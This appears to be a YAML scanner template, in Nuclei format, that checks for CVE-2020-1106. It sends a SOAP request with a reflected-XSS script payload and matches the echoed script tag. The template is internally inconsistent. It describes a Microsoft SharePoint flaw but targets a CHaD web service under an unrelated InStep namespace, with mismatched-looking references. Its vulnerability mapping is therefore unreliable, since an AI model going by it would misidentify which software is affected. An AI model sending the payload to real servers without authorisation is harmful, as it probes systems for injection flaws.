poc_all/cve/CVE-2020-1106.yaml

id: CVE-2020-1106

info:
  name: Microsoft Office SharePoint XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server.
  impact: |
    Successful exploitation could lead to unauthorized access or data theft.
  remediation: |
    Apply the latest security updates provided by Microsoft to mitigate the XSS vulnerability.
  reference:
    - https://www.talosintelligence.com/vulnerability_reports/TALOS-2020-1106
    - https://github.com/Live-Hack-CVE/CVE-2020-1106
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-1106
    cwe-id: CWE-79
    epss-score: 0.00168
    epss-percentile: 0.54746
    cpe: cpe:2.3:a:microsoft:sharepoint_enterprise_server:2016:*:*:*:*:*:*:*
  metadata:
    vendor: microsoft
    product: sharepoint_enterprise_server

http:
  - method: POST
    path:
      - "{{BaseURL}}/webservice/CHaD.asmx"

    headers:
      Content-Type: "application/soap+xml; charset=utf-8"

    body: |
      <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:web="http://instepsoftware.com/webservices">
        <soap:Header/>
        <soap:Body>
          <web:FindCHaDInstances>
            <web:InstancePath>aaa</web:InstancePath>
            <web:InstanceName>bbb</web:InstanceName>
            <web:ClassName><script>alert('XSS')</script></web:ClassName>
          </web:FindCHaDInstances>
        </soap:Body>
      </soap:Envelope>
    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
        part: body
